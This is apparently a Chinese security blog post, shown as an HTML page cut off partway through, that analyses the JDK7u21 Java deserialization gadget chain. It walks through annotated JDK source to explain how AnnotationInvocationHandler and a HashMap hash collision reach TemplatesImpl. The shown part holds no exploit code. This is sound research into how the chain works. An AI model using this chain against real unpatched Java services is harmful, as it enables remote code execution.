@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="文章首发于安全客：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;247684 最近在分析JDK7u21的Gadgets，有两个不解之处，阅读前辈们的文章发现并未提起：  为什么有的POC入口是LinkedHashSet，有的是HashSet，两个都可以触发吗？ 关于map.put(&quot;f5a5a608&quot;, templates);的位置，为什么将其放在set.a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于JDK7u21 Gadgets的两个问题的探讨">
+<meta property="og:url" content="http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="R17a&#39;s blog">
+<meta property="og:description" content="文章首发于安全客：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;247684 最近在分析JDK7u21的Gadgets，有两个不解之处，阅读前辈们的文章发现并未提起：  为什么有的POC入口是LinkedHashSet，有的是HashSet，两个都可以触发吗？ 关于map.put(&quot;f5a5a608&quot;, templates);的位置，为什么将其放在set.a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210713144702330.png">
+<meta property="og:image" content="http://yoursite.com/imgs/image-20210718094359578.png">
+<meta property="article:published_time" content="2021-07-27T03:24:32.000Z">
+<meta property="article:modified_time" content="2021-07-27T03:24:32.000Z">
+<meta property="article:author" content="R17a">
+<meta property="article:tag" content="JDK7U21">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/imgs/image-20210713144702330.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>关于JDK7u21 Gadgets的两个问题的探讨</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/07/29/WebLogic-CVE-2021-2135%E5%88%86%E6%9E%90%E5%8F%8APOC%E6%9E%84%E9%80%A0%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/07/19/%E7%94%B1JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AF%B9TemplatesImpl%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&text=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&is_video=false&description=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=关于JDK7u21 Gadgets的两个问题的探讨&body=Check out this article: http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&name=关于JDK7u21 Gadgets的两个问题的探讨&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&t=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、反序列化载体分析"><span class="toc-number">1.</span> <span class="toc-text">一、反序列化载体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、AnnotationInvocationHandler链"><span class="toc-number">1.1.</span> <span class="toc-text">1、AnnotationInvocationHandler链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1、AnnotationInvocationHandler-invoke"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1、AnnotationInvocationHandler.invoke()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2、-AnnotationInvocationHandler-equalsImpl"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2、 AnnotationInvocationHandler.equalsImpl()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、proxy-equals-TemplatesImpl实例"><span class="toc-number">1.2.</span> <span class="toc-text">2、proxy.equals(TemplatesImpl实例)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、HashMap-put"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1、HashMap.put()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、TemplatesImpl实例的哈希-Proxy实例的哈希"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2、TemplatesImpl实例的哈希&#x3D;&#x3D;Proxy实例的哈希</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3、如何能够调用HashMap-put？"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3、如何能够调用HashMap.put？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、为什么有的POC入口是LinkedHashSet，有的是HashSet？"><span class="toc-number">1.3.</span> <span class="toc-text">3、为什么有的POC入口是LinkedHashSet，有的是HashSet？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、关于map-put-quot-f5a5a608-quot-templates-的位置问题"><span class="toc-number">1.4.</span> <span class="toc-text">4、关于map.put(&quot;f5a5a608&quot;, templates);的位置问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、类似漏洞的挖掘思路"><span class="toc-number">2.</span> <span class="toc-text">二、类似漏洞的挖掘思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、漏洞修复"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、POC"><span class="toc-number">4.</span> <span class="toc-text">四、POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考："><span class="toc-number">5.</span> <span class="toc-text">参考：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        关于JDK7u21 Gadgets的两个问题的探讨
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">R17a</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-27T03:24:32.000Z" itemprop="datePublished">2021-07-27</time>
+        
+        (Updated: <time datetime="2021-07-27T03:24:32.000Z" itemprop="dateModified">2021-07-27</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a> › <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/JDK7U21/" rel="tag">JDK7U21</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/247684" target="_blank" rel="noopener">https://www.anquanke.com/post/id/247684</a></p>
+<p>最近在分析JDK7u21的Gadgets，有两个不解之处，阅读前辈们的文章发现并未提起：</p>
+<ol>
+<li>为什么有的POC入口是LinkedHashSet，有的是HashSet，两个都可以触发吗？</li>
+<li>关于<code>map.put(&quot;f5a5a608&quot;, templates);</code>的位置，为什么将其放在<code>set.add(proxy);</code>前面执行会导致反序列化执行命令失败的问题？</li>
+</ol>
+<p>就这两个疑惑进行调试分析，有了这篇文章。</p>
+<p>本次分析调试的POC放在最后一部分，需要的可以先copy。</p>
+<p>接下来本文将会按照以下思路分析探讨：</p>
+<ol>
+<li>Gadgets链反序列化载体的分析，为上述两个问题的解答做铺垫；</li>
+<li>两个疑惑的分析解答；</li>
+<li>我们挖掘此类漏洞的思路。</li>
+</ol>
+<h3 id="一、反序列化载体分析"><a href="#一、反序列化载体分析" class="headerlink" title="一、反序列化载体分析"></a>一、反序列化载体分析</h3><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank" rel="noopener">frohoff给出的Gadgets</a></p>
+<p><img src="/imgs/image-20210713144702330.png" alt="image-20210713144702330"></p>
+<p>命令执行载体TemplatesImpl分析过了，这里不涉及了。根据Gadgets我们知道是通过AnnotationInvocationHandler的invoke和equalsImpl调用了TemplatesImpl.getOutputProperties，那么我们先看下这部分。</p>
+<h4 id="1、AnnotationInvocationHandler链"><a href="#1、AnnotationInvocationHandler链" class="headerlink" title="1、AnnotationInvocationHandler链"></a>1、AnnotationInvocationHandler链</h4><p>POC中创建了一个动态代理proxy，用tempHandler代理Templates接口，根据动态代理知识我们知道实际就是AnnotationInvocationHandler的invoke代理了Templates接口的两个方法newTransformer()和getOutputProperties()。</p>
+<h5 id="1-1、AnnotationInvocationHandler-invoke"><a href="#1-1、AnnotationInvocationHandler-invoke" class="headerlink" title="1.1、AnnotationInvocationHandler.invoke()"></a>1.1、AnnotationInvocationHandler.invoke()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// invoke传入的参数：Object proxy 代理对象, Method method 代理实例上调用的接口方法的method, Object[] args 方法的实参</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// var4即代理的方法名</span></span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    <span class="comment">// var5即代理方法的参数数组</span></span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="comment">// 当代理方法是equals，并且参数只有一个是Object，也就是当代理的方法是proxy.equals(Object obj)</span></span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// equalsImpl传入的参数实际是代理方法的参数，如果这里传入TemplatesImpl实例，var3[0] = TemplatesImpl实例</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据动态代理相关知识，我们知道invoke()传入的参数是代理对象，被代理的方法及其参数只有在满足一定条件时（<code>var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class</code>）会调用equalsImpl。</p>
+<h5 id="1-2、-AnnotationInvocationHandler-equalsImpl"><a href="#1-2、-AnnotationInvocationHandler-equalsImpl" class="headerlink" title="1.2、 AnnotationInvocationHandler.equalsImpl()"></a>1.2、 AnnotationInvocationHandler.equalsImpl()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;<span class="comment">// 根据poc这里type指的就是初始化的Templates.class</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 传入的参数不是AnnotationInvocationHandler对象也不是Templates的实例时</span></span><br><span class="line">        <span class="comment">// getMemberMethods会获取AnnotationInvocationHandler.this.type.getDeclaredMethods()，即type属性代表的类Templates定义的方法</span></span><br><span class="line">        Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line">		<span class="comment">// Templates一共有2个方法newTransformer()和getOutputProperties()，循环调用所有方法</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            <span class="comment">// method对象</span></span><br><span class="line">            Method var5 = var2[var4];</span><br><span class="line">            <span class="comment">// 获取method名称，即方法名</span></span><br><span class="line">            String var6 = var5.getName();</span><br><span class="line">            Object var7 = <span class="keyword">this</span>.memberValues.get(var6);</span><br><span class="line">            Object var8 = <span class="keyword">null</span>;</span><br><span class="line">    		<span class="comment">// asOneOfUs：如果var1是动态代理类实例，并且其InvocationHandler是AnnotationInvocationHandler实例，如果不是的话，返回null</span></span><br><span class="line">            AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 没有var1不是InvocationHandler实例的情况</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// invoke调用方法：依次调用method.invoke，当var1是TemplatesImpl实例，就会调用TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties</span></span><br><span class="line">                    var8 = var5.invoke(var1);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据上面代码的分析我们能得出equalsImpl传入的参数是TemplatesImpl实例，并且AnnotationInvocationHandler.type属性是TemplatesImpl.class对象，我们就能调用TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties。那么当equalsImpl传入的参数是TemplatesImpl实例时，proxy.equals(Object obj)实际就是需要传入参数就是参数类型即TemplatesImpl.class。</p>
+<p>小结：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke(Object proxy, Method method,Object[0] templatesImpl)---满足条件（proxy.equals(TemplatesImpl实例)）---&gt;AnnotationInvocationHandler.equalsImpl(Templates实例)-----&gt;TemplatesImpl.newTransformer或TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure>
+
+<p>现在的问题是如何能满足<code>proxy.equals(TemplatesImpl实例)</code>这个条件。</p>
+<h4 id="2、proxy-equals-TemplatesImpl实例"><a href="#2、proxy-equals-TemplatesImpl实例" class="headerlink" title="2、proxy.equals(TemplatesImpl实例)"></a>2、proxy.equals(TemplatesImpl实例)</h4><h5 id="2-1、HashMap-put"><a href="#2-1、HashMap-put" class="headerlink" title="2.1、HashMap.put()"></a>2.1、HashMap.put()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">// 计算key的hash</span></span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="comment">// 返回hash在数组中的索引i</span></span><br><span class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 链表的操作，循环链表中的所有键值对</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="comment">// 条件1：当前键值对的hash == 要插入键值对的hash，条件2：当前键值对的key的值==要插入的键值对的key的值，条件3：当前要插入键值对的key.equals(当前键值对的key))</span></span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>jdk1.7的HashMap的数据结构是数组+链表，插入key-value操作：</p>
+<ul>
+<li>数组下标是key计算后的hash值；</li>
+<li>数组的值是一个链表；</li>
+<li>要插入一个新的key-value，如果key计算后的hash在数组中已经存在，则会在这个hash所在链表中插入这个value。当然插入之前要满足一个条件：插入的键值对的key不能在链表中已存在，即key的hash可以相等，但是key不能相等。</li>
+</ul>
+<p>所以HashMap在插入时会对key和已存在的hash进行比较，不允许相同的key的键值对重复进行插入。</p>
+<p>这跟本次链有什么关系？</p>
+<p>我们要找的是proxy.equals(TemplatesImpl实例)的调用，上面代码<code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code>当条件1满足且条件2不满足，会执行equal方法。如果要调用proxy.equals(TemplatesImpl实例)，那么需要让key=proxy，k=TemplatesImpl实例，即当前插入的键值对的key是proxy，并且需要key是TemplatesImpl实例的键值对已存在，那么我们就需要在插入的时候<strong>先插入TemplatesImpl实例再插入Proxy实例</strong>。这也说明了poc为什么要先添加TemplatesImpl实例再添加Proxy实例。</p>
+<p>接下来的问题是怎么让条件1满足条件2不满足？</p>
+<p>当key=proxy且k=TemplatesImpl实例时，两者一定不相等条件2满足。条件1（TemplatesImpl实例的哈希==proxy的哈希）怎么满足？</p>
+<h5 id="2-2、TemplatesImpl实例的哈希-Proxy实例的哈希"><a href="#2-2、TemplatesImpl实例的哈希-Proxy实例的哈希" class="headerlink" title="2.2、TemplatesImpl实例的哈希==Proxy实例的哈希"></a>2.2、TemplatesImpl实例的哈希==Proxy实例的哈希</h5><p>在HashMap中计算hash会调用hash()方法：<code>int hash = hash(key);</code>，我们先来看看hash()方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关键处</span></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line">    <span class="comment">// 这个函数确保在每个位位置仅相差常数倍的hashCodes冲突的数量有限(在默认加载因子下大约为8)。</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hash调用k的hashCode方法，即会调用k所代表的对象的该方法，那么我们需要看看Proxy.hashCode()和TemplatesImpl.hashCode()。</p>
+<p>TemplatesImpl内部没有定义hashCode()，所以调用的是Object的该方法，该方法是native方法，我们无法得知细节。</p>
+<p>Proxy内部也没有定义hashCode()，但是有这样的说明：</p>
